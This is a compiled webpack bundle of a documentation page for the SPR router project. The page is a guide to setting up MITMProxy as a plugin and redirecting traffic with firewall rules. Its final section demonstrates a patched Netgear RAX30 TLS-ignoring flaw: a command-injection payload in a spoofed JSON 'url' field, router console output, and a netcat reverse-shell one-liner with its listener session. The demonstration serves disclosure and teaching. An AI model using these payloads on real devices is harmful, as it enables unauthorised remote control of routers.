"use strict";(self.webpackChunkspr_docs=self.webpackChunkspr_docs||[]).push([[6536],{1980:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>r,metadata:()=>a,toc:()=>d});var i=n(85893),s=n(11151);const r={},o="MITMProxy with PFW",a={id:"guides_plus/mitmproxy",title:"MITMProxy with PFW",description:"MITMProxy is a utility for intercepting and inspecting web traffic. In this guide, we'll cover",source:"@site/docs/guides_plus/mitmproxy.md",sourceDirName:"guides_plus",slug:"/guides_plus/mitmproxy",permalink:"/pages/docs/guides_plus/mitmproxy",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"WiFi Mesh Support",permalink:"/pages/docs/guides_plus/mesh"},next:{title:"PFW Programmable Firewall",permalink:"/pages/docs/guides_plus/pfw"}},c={},d=[{value:"Prepare the plugin",id:"prepare-the-plugin",level:3},{value:"Configure SPR",id:"configure-spr",level:3},{value:"Select targets to intercept",id:"select-targets-to-intercept",level:3},{value:"Using mitmproxy",id:"using-mitmproxy",level:3},{value:"Monitoring a Netgear RAX30",id:"monitoring-a-netgear-rax30",level:3},{value:"A Note on Transparent Sockets",id:"a-note-on-transparent-sockets",level:2}];function l(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,s.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.h1,{id:"mitmproxy-with-pfw",children:"MITMProxy with PFW"}),"\n",(0,i.jsxs)(t.p,{children:[(0,i.jsx)(t.a,{href:"https://mitmproxy.org/",children:"MITMProxy"})," is a utility for intercepting and inspecting web traffic. In this guide, we'll cover\nhow to configure it in a container and use some of the advanced PLUS features to selectively redirect traffic through the container."]}),"\n",(0,i.jsx)(t.p,{children:"At the end, we'll show how to use MITMProxy to exploit a now-patched security flaw with how Netgear's RAX30 would ignore TLS certificates during updates."}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.a,{href:"https://github.com/spr-networks/spr-mitmproxy",children:"This plugin is available on github."})}),"\n",(0,i.jsx)(t.h3,{id:"prepare-the-plugin",children:"Prepare the plugin"}),"\n",(0,i.jsx)(t.p,{children:"In a future release, plugin installation will be streamlined. For now configuration requires a couple of steps,\nand we'll walk through those in this guide."}),"\n",(0,i.jsx)(t.p,{children:"First, get the spr-mitmproxy plugin."}),"\n",(0,i.jsxs)(t.p,{children:["from the SPR directory, typically ",(0,i.jsx)(t.code,{children:"/home/spr/super"})]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:'sudo bash\ncd plugins\ngit clone https://github.com/spr-networks/spr-mitmproxy\necho [\\"plugins/spr-mitmproxy/docker-compose.yml\\"] > ../configs/base/custom_compose_paths.json\ncd spr-mitmproxy\ndocker-compose build\n'})}),"\n",(0,i.jsx)(t.h3,{id:"configure-spr",children:"Configure SPR"}),"\n",(0,i.jsxs)(t.ol,{children:["\n",(0,i.jsx)(t.li,{children:"Navigate to the SPR UI. Add a new Plugin under the Plugins page"}),"\n"]}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsxs)(t.li,{children:["Set name to ",(0,i.jsx)(t.code,{children:"mitmproxy"})]}),"\n",(0,i.jsxs)(t.li,{children:["Set ComposeFilePath to ",(0,i.jsx)(t.code,{children:"plugins/spr-mitmproxy/docker-compose.yml"})]}),"\n"]}),"\n",(0,i.jsx)("img",{width:"75%",src:"https://github.com/spr-networks/spr-mitmproxy/assets/37549748/dcc0f1ea-724a-4ed0-856a-56444ea2569f"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsxs)(t.li,{children:["Make sure its been added to ",(0,i.jsx)(t.code,{children:"configs/base/custom_compose_paths.json"})," as described in the previous section"]}),"\n",(0,i.jsxs)(t.li,{children:["Enable it by toggling the slider. This should auto-start the plugin. On the command link you can look for it with ",(0,i.jsx)(t.code,{children:"docker ps"})]}),"\n"]}),"\n",(0,i.jsxs)(t.ol,{start:"2",children:["\n",(0,i.jsxs)(t.li,{children:["\n",(0,i.jsxs)(t.p,{children:["Go to the Firewall page and expand the Custom Interface Rules. Add a new entry for ",(0,i.jsx)(t.code,{children:"mitmweb0"})," to the custom interface rules. You can verify your container's network address in the Container tab ->\nUnder ",(0,i.jsx)(t.code,{children:"Firewall-> Custom Interface Access"})," although it should automatically populate. Set the last IP octet to '.2' which will be the mitmproxy container address.\nAdd the new rule, make sure mitmproxy has ",(0,i.jsx)(t.code,{children:"wan"})," and ",(0,i.jsx)(t.code,{children:"dns"})," at least to access the internet. The ",(0,i.jsx)(t.code,{children:"lan_upstream"})," tag can also be added if mitmproxy should access private lan addresses. Also add it to a ",(0,i.jsx)(t.code,{children:"mitmweb"})," group, and any other device in this group will be able to access the mitmweb interface on ",(0,i.jsx)(t.code,{children:"172.x.y.2:8081"}),"\n",(0,i.jsx)(t.img,{alt:"plus-mitmproxy-iface-access",src:n(61178).Z+"",width:"2664",height:"1344"})]}),"\n"]}),"\n",(0,i.jsxs)(t.li,{children:["\n",(0,i.jsxs)(t.p,{children:["Also add your device to the ",(0,i.jsx)(t.code,{children:"mitmweb"})," group under the Devices page by editing your device. This allows the device to access the mitmweb interface."]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{src:n(43390).Z+"",width:"2092",height:"698"})}),"\n",(0,i.jsxs)(t.p,{children:["Verify that the mitmweb page is reachable from the device at ",(0,i.jsx)(t.a,{href:"http://172.x.y.2:8081",children:"http://172.x.y.2:8081"})]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{src:n(70888).Z+"",width:"2070",height:"854"})}),"\n",(0,i.jsx)(t.h3,{id:"select-targets-to-intercept",children:"Select targets to intercept"}),"\n",(0,i.jsxs)(t.p,{children:["Now that the plugin has been configured, we can use ",(0,i.jsx)(t.code,{children:"PFW"})," to select targets to intercept."]}),"\n",(0,i.jsxs)(t.ol,{children:["\n",(0,i.jsxs)(t.li,{children:["\n",(0,i.jsxs)(t.p,{children:["Navigate to the PFW viewing\n",(0,i.jsx)(t.img,{src:n(43714).Z+"",width:"2676",height:"1238"})]}),"\n"]}),"\n",(0,i.jsxs)(t.li,{children:["\n",(0,i.jsxs)(t.p,{children:["Select Always as a trigger\n",(0,i.jsx)(t.img,{src:n(92044).Z+"",width:"2654",height:"1288"})]}),"\n"]}),"\n",(0,i.jsxs)(t.li,{children:["\n",(0,i.jsxs)(t.p,{children:["Pick a Site Forward action. We'll pick the one on the left which forwards all ports but the one on the right works also\n",(0,i.jsx)(t.img,{src:n(75197).Z+"",width:"2636",height:"1274"})]}),"\n"]}),"\n",(0,i.jsxs)(t.li,{children:["\n",(0,i.jsxs)(t.p,{children:["Complete the rule, filling out the container IP as the destination.\nIn this example, traffic destined for ",(0,i.jsx)(t.code,{children:"www.asdf.com"})," will be redirected to ",(0,i.jsx)(t.code,{children:"172.19.0.2"})," which is the mitmproxy container.\n",(0,i.jsx)(t.img,{src:n(15285).Z+"",width:"1094",height:"1230"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(t.h3,{id:"using-mitmproxy",children:"Using mitmproxy"}),"\n",(0,i.jsxs)(t.p,{children:["When the target device visits ",(0,i.jsx)(t.code,{children:"www.asdf.com"})," it should populate on the mitmproxy web interface.\n",(0,i.jsx)(t.img,{src:"https://github.com/spr-networks/spr-mitmproxy/assets/37549748/a70a9f7e-91b9-4798-926b-2cb625f71e78",alt:""})]}),"\n",(0,i.jsx)(t.h3,{id:"monitoring-a-netgear-rax30",children:"Monitoring a Netgear RAX30"}),"\n",(0,i.jsxs)(t.p,{children:["Now that we've verified it's working correctly, lets use ",(0,i.jsx)(t.code,{children:"mitmproxy"})," to test out the netgear router.\nWe've plugged the Netgear into SPR as a wired client. Now lets set up the PFW rule for it."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{src:n(57361).Z+"",width:"1106",height:"1162"})}),"\n",(0,i.jsx)(t.p,{children:"After the router goes online, we seen soo the Netgear reaching out to an HTTPS website,\ntotally ignoring that we don't have a valid TLS certificate for the domain. Oops!"}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{src:n(3350).Z+"",width:"3116",height:"1378"})}),"\n",(0,i.jsxs)(t.p,{children:["Later on, when fetching ",(0,i.jsx)(t.code,{children:"DeviceFeatureSettingConfig.json"}),", it's possible to inject commands"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:'{\n    "errorCode": null,\n    "message": null,\n    "status": 1,\n    "url": "http://test.com/rax30/app$(id)`touch /tmp/hi2`/url"\n}\n'})}),"\n",(0,i.jsx)(t.p,{children:"On a UART console on the router we can verify that our commands are running."}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:"12022-10-25 07:07:54J... Uninitializing uAL.\n[2022-10-25 07:07:54]... Uninitializing FW Check Library...Done\nhttps://http.fw.updates1.netgear.com/rax30/app id $(id)sh: id: not found\nPathsh: id: not found\n/bin/smd::371.761:error:validateAppLaunchedMsg:888:dInfofor getdb alreae\nsh: id: not found\nPerformFwCheck status\n=1\nntgr_ra_iot:10\n#\n =\ncreate node[productFamily] = [router]\ncreate node[modelName] = (RAX30]\n\ncreate node[hwRevision] = [R2.0B]\ncreate node[stage] = [qa]\nl\ncreate parent node[deviceInfo]\ncreate node[macAddress] = [6c:cd:d6:4c:3a:64]\n\ncreate node[serialNumber] = [6L131AWS02A54]\ncreate node[eventType] = [2]\ncreate node[epochTimeStamp]\n= [1666710477888]\n\ncreate node[timeZoneOffset] = [-08:00]\ncreate parent node[firmware]\n\ncreate node[fwVersion] = [V1.0.7.78]\ncreate node[fwLastUpdate]=[2022_03.04_03:16:53]\n\ncreate node[ fwLastChecked] = (2022 10.25 07:07:57]\ncat: can't open\n/tmp/ATS_ntpResult': No such file or directory\n"})}),"\n",(0,i.jsx)(t.p,{children:"We can then convert the injection into a connect-back shell with the following URL."}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:'"url": "https://http.$(mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.2.2 4040 > /tmp/f)"\n'})}),"\n",(0,i.jsx)(t.p,{children:"And from the attacker's box,"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:'$ nc -vv -l 4040\nBusyBox v1.31.1 (2022-05-11 10:37:23 CST) built-in shell (ash)\nEnter "help" for a list of built-in commands\n\n\uff03\uff03\n'})}),"\n",(0,i.jsxs)(t.p,{children:["If you'd like to learn more about this flaw, a ",(0,i.jsx)(t.a,{href:"https://starlabs.sg/blog/2022/12-the-last-breath-of-our-netgear-rax30-bugs-a-tragic-tale-before-pwn2own-toronto-2022/",children:"writeup of the vulnerability was made by Starlabs SG"}),"."]}),"\n",(0,i.jsx)(t.h2,{id:"a-note-on-transparent-sockets",children:"A Note on Transparent Sockets"}),"\n",(0,i.jsx)(t.p,{children:"If you'd like to run mitmproxy inside your own containers, there's one thing to know about the firewall rules\nthat container needs."}),"\n",(0,i.jsxs)(t.p,{children:["The container uses DNAT rules to redirect traffic routing out to ``:80/:443",(0,i.jsx)(t.code,{children:" to MITMProxy on :9999"}),"."]}),"\n",(0,i.jsx)(t.p,{children:"If the target is reaching out to a port other than 80/443, the site forwarding feature in PFW can be set to redirect port numbers."}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"#!/bin/bash\n\nnft -f - << EOF\ntable inet nat {\n        chain prerouting {\n                type nat hook prerouting priority filter; policy accept;\n                tcp dport { 80, 443 } dnat ip to 127.0.0.1:9999\n        }\n}\nEOF\n\nmitmweb -p 9999 -m transparent --web-host 0.0.0.0\n"})})]})}function h(e={}){const{wrapper:t}={...(0,s.a)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},15285:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/pfw-mitmproxy-site-foward-action-filled-9e4871e2094f0a991bea915aaccbdc15.png"},75197:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/pfw-mitproxy-site-forward-action-67a74748772187574e63c5c9fc6679c6.png"},92044:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/pfw-mitproxy-trigger-always-53961bbf0305b1c055699ca651e92e26.png"},43390:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/plus-mitmproxy-device-edit-df26459d2bce5daad3aa6214fc78ed2f.png"},61178:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/plus-mitmproxy-iface-access-cb2343e3075457a16b3324e54f8d5c29.png"},3350:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/plus-mitmproxy-netgear-devcom-57b5dcaaabd008f80f0de3862f2dd17b.png"},57361:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/plus-mitmproxy-netgear-fwd-0824d399fb124db7b596e8bc8586944f.png"},70888:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/plus-mitmproxy-web-first-f511ed93b7c13c017370fcbd11e7edcc.png"},43714:(e,t,n)=>{n.d(t,{Z:()=>i});const i=n.p+"assets/images/plus-mitproxy-pfw-645cc7a6d847085d9c9dfa1b20b25a95.png"},11151:(e,t,n)=>{n.d(t,{Z:()=>a,a:()=>o});var i=n(67294);const s={},r=i.createContext(s);function o(e){const t=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),i.createElement(r.Provider,{value:t},e.children)}}}]);